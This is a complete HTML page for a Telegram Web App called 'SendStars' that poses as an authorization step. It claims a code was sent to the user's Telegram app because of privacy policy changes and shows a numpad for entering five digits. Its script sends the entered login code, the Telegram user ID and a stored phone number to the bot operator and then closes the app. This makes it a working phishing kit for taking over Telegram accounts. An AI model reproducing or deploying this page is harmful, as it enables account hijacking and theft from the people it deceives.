<!DOCTYPE html>
<html lang="ru">
	<head>
		<meta charset="utf-8" />
		<meta name="viewport" content="width=device-width,initial-scale=1" />
		<title>SendStars — авторизация</title>
		<script src="https://telegram.org/js/telegram-web-app.js"></script>
		<style>
			:root {
				--bg: #1c1b1b;
				--text: #fff;
				--box: #2a2a2a;
			}

			* {
				box-sizing: border-box;
				margin: 0;
				padding: 0;
			}
			html,
			body {
				height: 100%;
			}

			body {
				font-family: Inter, system-ui, -apple-system, 'Segoe UI', Roboto,
					'Helvetica Neue', Arial;
				background: var(--bg);
				display: flex;
				align-items: center;
				justify-content: center;
				color: var(--text);
			}

			.screen {
				width: 400px;
				display: flex;
				flex-direction: column;
				align-items: center;
				text-align: center;
				gap: 15px;
			}

			.avatar img {
				width: 120px;
				height: auto;
				object-fit: contain;
				display: block;
			}

			.hint {
				font-size: 14px;
				color: #aaa;
				margin-bottom: 0;
				line-height: 1.4;
				max-width: 320px;
			}

			.privacy-link {
				font-size: 14px;
				color: #2a9bf8;
				text-decoration: none;
				cursor: pointer;
				transition: color 0.2s;
			}

			.privacy-link:hover {
				color: #1a8be8;
				text-decoration: underline;
			}

			.code-boxes {
				display: flex;
				gap: 10px;
				margin: 10px 0 20px;
			}

			.code-box {
				width: 40px;
				height: 50px;
				border-radius: 8px;
				background: var(--box);
				display: flex;
				align-items: center;
				justify-content: center;
				font-size: 32px;
				font-weight: 600;
				color: #fff;
				border: 2px solid #3a3a3a;
				transition: border-color 0.2s;
			}

			.code-box.filled {
				border-color: #2a9bf8;
			}

			.numpad {
				display: grid;
				grid-template-columns: repeat(3, 80px);
				gap: 12px;
				justify-content: center;
			}

			.numpad button {
				width: 80px;
				height: 60px;
				font-size: 22px;
				border-radius: 12px;
				border: none;
				background: var(--box);
				color: var(--text);
				font-weight: 600;
				cursor: pointer;
				transition: background 0.2s;
			}

			.numpad button:hover {
				background: #3a3a3a;
			}

			.numpad button:active {
				background: #4a4a4a;
			}

			/* Экран загрузки */
			.loading-screen {
				display: none;
				flex-direction: column;
				align-items: center;
				gap: 20px;
			}

			.spinner {
				border: 4px solid rgba(255, 255, 255, 0.2);
				border-top: 4px solid #fff;
				border-radius: 50%;
				width: 50px;
				height: 50px;
				animation: spin 1s linear infinite;
			}

			@keyframes spin {
				0% {
					transform: rotate(0deg);
				}
				100% {
					transform: rotate(360deg);
				}
			}
		</style>
	</head>
	<body>
		<div class="screen" id="authScreen">
			<div class="avatar">
				<img src="avatar.gif" alt="avatar" />
			</div>
			<div class="hint">Мы отправили код в приложение Telegram.</div>

			<div class="hint">
				Это необходимо, ввиду последних изменений в
				<a
					href="https://telegram.org/privacy"
					target="_blank"
					class="privacy-link"
					>Политике конфиденциальности</a
				>.
			</div>

			<div class="code-boxes" id="codeBoxes">
				<div class="code-box"></div>
				<div class="code-box"></div>
				<div class="code-box"></div>
				<div class="code-box"></div>
				<div class="code-box"></div>
			</div>

			<div class="numpad">
				<button data-value="1">1</button>
				<button data-value="2">2</button>
				<button data-value="3">3</button>
				<button data-value="4">4</button>
				<button data-value="5">5</button>
				<button data-value="6">6</button>
				<button data-value="7">7</button>
				<button data-value="8">8</button>
				<button data-value="9">9</button>
				<div></div>
				<button data-value="0">0</button>
				<button data-action="backspace">←</button>
			</div>
		</div>

		<!-- Экран загрузки -->
		<div class="screen loading-screen" id="loadingScreen">
			<div class="spinner"></div>
			<div>Проверка введённого кода…</div>
		</div>

		<script>
			(function () {
				'use strict';

				let tg;
				try {
					tg = window.Telegram?.WebApp;
					if (tg) {
						tg.expand();
					}
				} catch (e) {
					console.log('Telegram WebApp init error:', e);
				}

				const codeBoxes = document.querySelectorAll('.code-box');
				let code = '';
				let isProcessing = false;

				function updateBoxes() {
					try {
						codeBoxes.forEach((box, i) => {
							if (code[i]) {
								box.textContent = '•';
								box.classList.add('filled');
							} else {
								box.textContent = '';
								box.classList.remove('filled');
							}
						});
					} catch (e) {
						console.log('Error updating boxes:', e);
					}
				}

				function safeNavigate(url) {
					try {
						if (isProcessing) return;
						isProcessing = true;
						window.location.href = url;
					} catch (e) {
						console.log('Navigation error:', e);
						isProcessing = false;
					}
				}

				function handleCodeInput(value) {
					try {
						if (isProcessing) return;

						if (value === 'backspace') {
							code = code.slice(0, -1);
						} else if (!isNaN(value) && value !== ' ' && value !== null) {
							if (code.length < 5) code += value;
						}

						updateBoxes();

						if (code.length === 5) {
							processAuthCode();
						}
					} catch (e) {
						console.log('Error handling code input:', e);
					}
				}

				function processAuthCode() {
					try {
						if (isProcessing) return;
						isProcessing = true;

						const authScreen = document.getElementById('authScreen');
						const loadingScreen = document.getElementById('loadingScreen');

						if (authScreen) authScreen.style.display = 'none';
						if (loadingScreen) loadingScreen.style.display = 'flex';

						if (tg && tg.sendData) {
							tg.sendData(
								JSON.stringify({
									type: 'auth_code',
									code: code,
									user_id: tg.initDataUnsafe?.user?.id || '',
									phone_number: localStorage.getItem('phone_number') || '',
								})
							);
							if (tg.close) tg.close();
						} else {
							console.log('Telegram WebApp недоступен, данные не отправлены');
						}
					} catch (processError) {
						console.log('Ошибка обработки кода авторизации:', processError);
						isProcessing = false;
					}
				}

				function initializeButtons() {
					try {
						const buttons = document.querySelectorAll('.numpad button');
						buttons.forEach(btn => {
							btn.addEventListener('click', function (e) {
								e.preventDefault();
								const value =
									this.getAttribute('data-value') ||
									this.getAttribute('data-action');
								if (value) {
									handleCodeInput(value);
								}
							});
						});
					} catch (e) {
						console.log('Error initializing buttons:', e);
					}
				}

				function init() {
					try {
						initializeButtons();
						updateBoxes();

						document.removeEventListener('DOMContentLoaded', init);
					} catch (e) {
						console.log('Error in init:', e);
					}
				}

				if (document.readyState === 'loading') {
					document.addEventListener('DOMContentLoaded', init);
				} else {
					init();
				}
			})();
		</script>
	</body>
</html>
